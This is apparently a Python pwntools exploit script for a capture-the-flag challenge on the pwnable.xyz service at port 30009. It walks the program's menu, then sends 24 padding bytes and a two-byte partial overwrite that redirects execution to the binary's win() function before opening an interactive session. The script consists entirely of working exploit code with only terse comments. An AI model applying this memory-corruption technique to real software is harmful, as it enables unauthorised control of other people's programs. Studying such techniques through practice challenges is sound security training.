from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30009)

p.sendafter(':','A'*16) # name
p.sendlineafter('>','1') # play
p.sendafter('=','1') # anything
p.sendlineafter('>','2') # save
p.sendlineafter('>','3') # read(0,cur,sizeof(cur))
payload = 'A'*24 + p16(0x9d6) # size -> 2byte & 0x4009d6 -> win();
p.send(payload)

p.interactive()